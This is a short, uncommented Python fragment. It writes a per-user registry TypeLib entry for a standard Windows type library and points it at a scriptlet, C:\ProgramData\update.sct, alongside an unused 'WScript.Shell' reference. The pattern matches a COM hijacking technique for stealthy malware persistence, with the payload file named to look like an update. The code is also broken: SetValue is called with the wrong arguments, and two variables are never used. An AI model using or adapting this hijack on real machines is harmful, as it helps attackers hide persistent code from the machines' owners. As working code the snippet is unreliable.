from winreg import SetValue
clsid = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}"
key = r"Software\Classes\TypeLib\{00020430-0000-0000-C000-000000000046}\2.0\0\win64"
SetValue(key, r"C:\ProgramData\update.sct")
progid = "WScript.Shell"
